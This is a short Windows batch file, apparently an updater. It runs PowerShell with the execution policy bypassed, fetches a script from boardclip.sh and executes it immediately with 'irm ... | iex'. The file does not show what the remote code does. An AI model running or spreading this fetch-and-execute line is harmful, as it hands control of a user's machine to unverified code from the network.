@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://boardclip.sh/update.ps1 | iex"
